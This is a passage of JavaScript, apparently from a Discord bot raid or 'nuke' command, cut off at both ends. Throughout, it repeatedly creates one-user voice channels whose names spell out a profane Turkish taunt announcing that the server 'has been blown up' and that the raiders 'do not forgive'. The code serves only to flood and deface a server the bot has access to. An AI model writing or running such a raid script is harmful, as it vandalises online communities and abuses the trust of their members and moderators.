      .createChannel("SİKER", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("EGE", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HAPİS", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("YATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("İCRAAT", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("BU SUNUCU", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SİKER", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("EGE", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HAPİS", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("YATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("İCRAAT", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("BU SUNUCU", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SİKER", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("EGE", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HAPİS", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("YATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("İCRAAT", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("BU SUNUCU", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SİKER", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("EGE", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HAPİS", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("YATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("İCRAAT", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("BU SUNUCU", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SİKER", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("EGE", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HAPİS", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("YATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("İCRAAT", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("BU SUNUCU", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SİKER", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("EGE", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HAPİS", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("YATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("İCRAAT", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("BU SUNUCU", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SİKER", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("EGE", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HAPİS", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("YATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("İCRAAT", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("BU SUNUCU", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SİKER", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("EGE", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HAPİS", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("YATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("İCRAAT", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("BU SUNUCU", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SİKER", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("EGE", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HAPİS", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("YATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("İCRAAT", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("BU SUNUCU", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SİKER", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("EGE", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HAPİS", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("YATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("İCRAAT", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("BU SUNUCU", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SİKER", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("EGE", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HAPİS", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("YATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("İCRAAT", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("BU SUNUCU", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SİKER", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("EGE", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HAPİS", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("YATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("İCRAAT", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("BU SUNUCU", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SİKER", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("EGE", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HAPİS", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("YATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("İCRAAT", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("BU SUNUCU", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SİKER", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("EGE", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HAPİS", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("YATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("İCRAAT", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("BU SUNUCU", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SİKER", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("EGE", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HAPİS", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("YATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("İCRAAT", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("BU SUNUCU", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SİKER", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("EGE", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HAPİS", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("YATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("İCRAAT", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("BU SUNUCU", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SİKER", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("EGE", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HAPİS", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("YATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("İCRAAT", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("BU SUNUCU", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SİKER", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("EGE", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HAPİS", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("YATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("İCRAAT", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("BU SUNUCU", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SİKER", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("EGE", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HAPİS", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("YATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("İCRAAT", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("BU SUNUCU", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SİKER", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("EGE", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HAPİS", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("YATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
